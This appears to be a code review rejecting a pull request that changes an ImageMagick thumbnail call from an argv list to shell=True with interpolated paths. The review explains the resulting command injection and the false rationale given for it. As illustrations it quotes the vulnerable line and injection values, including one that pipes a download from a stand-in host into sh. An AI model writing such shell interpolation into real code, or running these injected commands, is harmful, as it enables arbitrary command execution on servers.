findings.body:
Switching from an argv list to `shell=True` with an f-string interpolates `upload_dir`, `name`, and `oid` into a shell command. Any of those values can inject metacharacters (`;`, `|`, `$(...)`, spaces) and run arbitrary commands as the reviewer/process user — e.g. `name` = `foo.png; id > /tmp/pwned`.

ImageMagick policy/delegates do not require a shell: keep the list form so paths stay opaque argv elements. If IM7 needs a different binary, use that path in argv only:

```suggestion
    subprocess.run(
        ["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"],
        check=True,
    )
```

Also restore the absolute binary path (or `/usr/bin/magick`) so a poisoned `PATH` cannot substitute another executable.

The new comment claims shell form is required for the ImageMagick policy delegate. That is incorrect: delegates and `policy.xml` apply when `convert`/`magick` is executed directly. The previous comment at least documented an upstream `ALLOWED_FILES` check on `name`; removing it hides the only mentioned sanitization while the code becomes more dangerous.

Restore an accurate comment (and keep argv-list invocation). If IM7 needs `magick` instead of `convert`, document that executable choice — not `shell=True`.

summary:
## Verdict

**Do not merge** — this change replaces a safe argv-list `subprocess.run` with `shell=True` and unquoted f-string interpolation of `upload_dir`, `name`, and `oid`, which is classic command injection.

## Why this is wrong

The previous form:

```python
subprocess.run(["/usr/bin/convert", f"{upload_dir}/{name}", f"/srv/thumbs/{oid}.png"], check=True)
```

passes paths as opaque argv elements. The shell never sees them, so metacharacters in any of the three parameters cannot spawn extra commands.

The new form:

```python
subprocess.run(f"convert {upload_dir}/{name} /srv/thumbs/{oid}.png", shell=True, check=True)
```

hands the entire string to `/bin/sh`. A crafted `name` such as `x; curl evil.test | sh` (or similar in `upload_dir` / `oid`) runs as the process user. The PR also drops the absolute `/usr/bin/convert` path, so a poisoned `PATH` can substitute a different binary.

The stated rationale (“ImageMagick 7 needs the policy delegate”) does not require `shell=True`. IM policy is enforced inside the `convert`/`magick` binary under normal `exec`, not via the shell. If IM7 needs the `magick` frontend or different args, keep the argv-list form and change only the executable/flags.

The removed comment that `name` was validated upstream by `ALLOWED_FILES` is also a regression in documentation; even with that validation, `upload_dir` and `oid` remain interpolated and unvalidated in-tree.

## Recommendation

Revert to argv-list form (optionally switch the binary to `/usr/bin/magick` if that is the IM7 requirement). Do not use `shell=True` for this conversion.

**Recommendation:** request-changes
